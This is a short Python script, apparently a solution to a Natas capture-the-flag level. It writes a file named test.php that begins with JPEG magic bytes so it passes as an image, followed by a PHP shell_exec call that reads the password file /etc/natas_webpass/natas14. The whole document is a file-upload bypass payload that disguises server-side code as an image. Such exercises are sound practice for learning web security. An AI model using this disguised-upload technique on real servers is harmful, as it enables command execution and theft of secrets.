#!/bin/python
fp = open("test.php",'w')
fp.write('\xFF\xD8\xFF\xE0' + 'shell_exec("cat /etc/natas_webpass/natas14");')
fp.close()
